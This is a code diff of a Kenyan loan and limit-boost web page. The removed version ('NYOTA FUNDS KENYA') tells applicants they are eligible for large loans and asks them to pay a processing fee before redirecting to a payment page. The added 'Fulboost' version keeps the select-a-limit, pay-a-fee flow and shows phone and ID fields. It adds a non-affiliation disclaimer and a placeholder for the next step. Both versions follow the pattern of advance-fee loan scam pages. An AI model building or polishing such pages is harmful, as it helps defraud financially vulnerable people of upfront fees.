@@ -1,212 +1,387 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>NYOTA FUNDS KENYA</title>
-<style>
+<title>Fulboost — Select Your Limit</title>
 
+<style>
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
 }
 
 body{
-background:#0B0217;
-color:#fff;
-min-height:100vh;
+    min-height:100vh;
+    background:#f4f7f8;
+    font-family:Arial,sans-serif;
+    color:#222;
 }
 
 .container{
-max-width:500px;
-margin:auto;
-min-height:100vh;
-padding:20px;
-display:flex;
-flex-direction:column;
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+header{
+    background:#087f3e;
+    color:#fff;
+    padding:22px 0;
+}
+
+.logo{
+    font-size:25px;
+    font-weight:700;
+}
+
+.brand{
+    margin-top:4px;
+    font-size:13px;
+    opacity:.9;
+}
+
+.profile{
+    background:#fff;
+    margin-top:20px;
+    padding:18px;
+    border-radius:12px;
+    box-shadow:0 2px 8px rgba(0,0,0,.07);
+}
+
+.profile-top{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:15px;
+}
+
+.avatar{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+    background:#e8f4ed;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:21px;
+}
+
+.name{
+    font-size:17px;
+    font-weight:700;
+}
+
+.info{
+    border-top:1px solid #eee;
+    padding-top:12px;
+}
+
+.info-row{
+    display:flex;
+    justify-content:space-between;
+    padding:6px 0;
+    font-size:14px;
+}
+
+.label{
+    color:#777;
+}
+
+.value{
+    font-weight:600;
+}
+
+.card{
+    background:#fff;
+    margin-top:18px;
+    padding:22px 18px;
+    border-radius:14px;
+    box-shadow:0 2px 10px rgba(0,0,0,.07);
 }
 
 h1{
-text-align:center;
-color:#fff;
-font-size:28px;
-margin-bottom:20px;
+    font-size:22px;
+    margin-bottom:9px;
 }
 
-.message{
-text-align:center;
-font-size:17px;
-line-height:1.8;
-margin-bottom:25px;
-color:rgba(255,255,255,0.72);
+.description{
+    color:#666;
+    font-size:14px;
+    line-height:1.5;
+    margin-bottom:20px;
 }
 
-h2{
-text-align:center;
-color:#fff;
-font-size:22px;
-margin-bottom:20px;
+.options{
+    display:flex;
+    flex-direction:column;
+    gap:11px;
 }
 
-.amount-grid{
-display:grid;
-grid-template-columns:1fr 1fr;
-gap:15px;
+.limit-option{
+    width:100%;
+    background:#fff;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:15px;
+    cursor:pointer;
+    text-align:left;
+    transition:.2s;
 }
 
-.amount-btn{
-background:rgba(255,255,255,0.055);
-color:#fff;
-border:1px solid rgba(255,255,255,0.10);
-border-radius:15px;
-padding:18px 10px;
-font-size:18px;
-font-weight:bold;
-cursor:pointer;
-transition:.3s;
+.limit-option:hover{
+    border-color:#087f3e;
+    background:#f7fbf8;
 }
 
-.amount-btn.selected{
-background:linear-gradient(135deg,#9B35FF,#6C1DCE);
-border-color:#9B35FF;
+.limit{
+    font-size:17px;
+    font-weight:700;
+    color:#087f3e;
 }
 
-#feeDisplay{
-margin:25px 0;
-text-align:center;
-font-size:20px;
-font-weight:bold;
-min-height:30px;
-color:rgba(255,255,255,0.85);
+.fee{
+    margin-top:5px;
+    font-size:13px;
+    color:#666;
+}
+
+.selected{
+    border:2px solid #087f3e;
+    background:#f0f8f3;
 }
 
 .continue-btn{
-margin-top:auto;
-width:100%;
-padding:18px;
-background:linear-gradient(135deg,#9B35FF,#6C1DCE);
-color:white;
-border:none;
-border-radius:15px;
-font-size:22px;
-font-weight:bold;
-cursor:pointer;
+    width:100%;
+    margin-top:20px;
+    padding:15px;
+    border:none;
+    border-radius:9px;
+    background:#087f3e;
+    color:#fff;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
 }
 
-</style>
+.continue-btn:disabled{
+    background:#aaa;
+    cursor:not-allowed;
+}
 
+.notice{
+    margin-top:16px;
+    padding:13px;
+    background:#f0f7f3;
+    border-radius:8px;
+    color:#555;
+    font-size:12px;
+    line-height:1.5;
+}
+
+footer{
+    text-align:center;
+    padding:24px 10px;
+    color:#777;
+    font-size:12px;
+    line-height:1.7;
+}
+
+footer a{
+    color:#087f3e;
+    text-decoration:none;
+}
+</style>
 </head>
 
 <body>
 
-<div class="container">
+<header>
+    <div class="container">
+        <div class="logo">FULBOOST</div>
+        <div class="brand">Limit Management Portal</div>
+    </div>
+</header>
 
-<h1>NYOTA FUNDS KENYA</h1>
+<main class="container">
 
-<div class="message">
+    <section class="profile">
 
-Congratulations 🎉 <span id="applicantName"></span><br><br>
+        <div class="profile-top">
+            <div class="avatar">👤</div>
 
-You're eligible for <b>NYOTA Funds Limits.</b><br>
+            <div>
+                <div class="name" id="displayName">
+                    Account Holder
+                </div>
+            </div>
+        </div>
 
-Kindly choose the amount you want and pay the processing fee to continue.
+        <div class="info">
 
-</div>
+            <div class="info-row">
+                <span class="label">Phone</span>
+                <span class="value" id="displayPhone">
+                    —
+                </span>
+            </div>
 
-<h2>Select Your NYOTA Fund Amount</h2>
+            <div class="info-row">
+                <span class="label">ID</span>
+                <span class="value" id="displayId">
+                    —
+                </span>
+            </div>
 
-<div class="amount-grid">
+            <div class="info-row">
+                <span class="label">Current Limit</span>
+                <span class="value" id="displayLimit">
+                    —
+                </span>
+            </div>
 
-<button class="amount-btn" onclick="selectAmount(22000,this)">Ksh 22,000</button>
+        </div>
 
-<button class="amount-btn" onclick="selectAmount(30000,this)">Ksh 30,000</button>
+    </section>
 
-<button class="amount-btn" onclick="selectAmount(40000,this)">Ksh 40,000</button>
+    <section class="card">
 
-<button class="amount-btn" onclick="selectAmount(50000,this)">Ksh 50,000</button>
+        <h1>Select Your Desired Limit</h1>
 
-<button class="amount-btn" onclick="selectAmount(65000,this)">Ksh 65,000</button>
+        <p class="description">
+            Choose a limit option available through the
+            Fulboost service. Fees shown below are for
+            service information only.
+        </p>
 
-<button class="amount-btn" onclick="selectAmount(75000,this)">Ksh 75,000</button>
+        <div class="options">
 
-<button class="amount-btn" onclick="selectAmount(85000,this)">Ksh 85,000</button>
+            <button class="limit-option" data-limit="8000" data-fee="300">
+                <div class="limit">KSh 8,000</div>
+                <div class="fee">Service Fee: KSh 300</div>
+            </button>
 
-<button class="amount-btn" onclick="selectAmount(110000,this)">Ksh 110,000</button>
+            <button class="limit-option" data-limit="15000" data-fee="400">
+                <div class="limit">KSh 15,000</div>
+                <div class="fee">Service Fee: KSh 400</div>
+            </button>
 
-<button class="amount-btn" onclick="selectAmount(150000,this)">Ksh 150,000</button>
+            <button class="limit-option" data-limit="25000" data-fee="450">
+                <div class="limit">KSh 25,000</div>
+                <div class="fee">Service Fee: KSh 450</div>
+            </button>
 
-</div>
+            <button class="limit-option" data-limit="35000" data-fee="550">
+                <div class="limit">KSh 35,000</div>
+                <div class="fee">Service Fee: KSh 550</div>
+            </button>
 
-<div id="feeDisplay">
-Select an amount to see the processing fee.
-</div>
+            <button class="limit-option" data-limit="55000" data-fee="650">
+                <div class="limit">KSh 55,000</div>
+                <div class="fee">Service Fee: KSh 650</div>
+            </button>
 
-<button class="continue-btn" onclick="continueNext()">
-Continue
-</button>
+            <button class="limit-option" data-limit="65000" data-fee="800">
+                <div class="limit">KSh 65,000</div>
+                <div class="fee">Service Fee: KSh 800</div>
+            </button>
+
+            <button class="limit-option" data-limit="75000" data-fee="900">
+                <div class="limit">KSh 75,000</div>
+                <div class="fee">Service Fee: KSh 900</div>
+            </button>
+
+            <button class="limit-option" data-limit="85000" data-fee="1050">
+                <div class="limit">KSh 85,000</div>
+                <div class="fee">Service Fee: KSh 1,050</div>
+            </button>
+
+        </div>
+
+        <button
+            type="button"
+            class="continue-btn"
+            id="continueBtn"
+            disabled
+        >
+            Select a Limit
+        </button>
+
+        <div class="notice">
+            Fulboost is an independent service and is not
+            affiliated with or endorsed by Safaricom PLC.
+            Selecting an option does not guarantee approval
+            or a change to any mobile-money account limit.
+        </div>
+
+    </section>
+
+</main>
+
+<footer>
+    <a href="#">Terms &amp; Conditions</a> |
+    <a href="#">Privacy Policy</a> |
+    <a href="#">Support</a>
+
+    <br>
+
+    © 2026 Fulboost
+</footer>
+
 <script>
+const options = document.querySelectorAll(".limit-option");
+const continueBtn = document.getElementById("continueBtn");
 
-const fees = {
-22000:350,
-30000:400,
-40000:460,
-50000:520,
-65000:660,
-75000:780,
-85000:900,
-110000:1240,
-150000:1500
-};
+let selectedLimit = null;
+let selectedFee = null;
 
-let selectedAmount = null;
-  
-document.getElementById("applicantName").textContent =
-localStorage.getItem("applicantName") || "Applicant";
-function selectAmount(amount, btn){
+options.forEach(option => {
 
-selectedAmount = amount;
+    option.addEventListener("click", () => {
 
-document.querySelectorAll(".amount-btn").forEach(button=>{
-button.classList.remove("selected");
+        options.forEach(item => {
+            item.classList.remove("selected");
+        });
+
+        option.classList.add("selected");
+
+        selectedLimit = option.dataset.limit;
+        selectedFee = option.dataset.fee;
+
+        continueBtn.disabled = false;
+
+        continueBtn.textContent =
+            "Continue with KSh " +
+            Number(selectedLimit).toLocaleString();
+    });
+
 });
 
-btn.classList.add("selected");
+continueBtn.addEventListener("click", () => {
 
-document.getElementById("feeDisplay").innerHTML =
-"Processing Fee: <span style='color:#00ff66;'>Ksh " +
-fees[amount].toLocaleString() +
-"</span>";
+    if(!selectedLimit){
+        return;
+    }
 
-localStorage.setItem("selectedAmount", amount);
-localStorage.setItem("processingFee", fees[amount]);
+    sessionStorage.setItem("selectedLimit", selectedLimit);
+    sessionStorage.setItem("serviceFee", selectedFee);
 
-}
+    /*
+      Add your legitimate next-step page here.
+      Example:
 
-function continueNext(){
+      window.location.href = "next.html";
+    */
 
-if(selectedAmount === null){
-alert("Please select an amount first.");
-return;
-}
+    alert(
+        "Selected limit: KSh " +
+        Number(selectedLimit).toLocaleString()
+    );
 
-const button = document.querySelector(".continue-btn");
-
-button.textContent = "Processing...";
-button.disabled = true;
-button.style.opacity = "0.7";
-button.style.cursor = "not-allowed";
-
-setTimeout(() => {
-    window.location.href = "payment.html";
-}, 1000);
-
-}
-
+});
 </script>
 
 </body>
-                                                                          </html>
+</html>
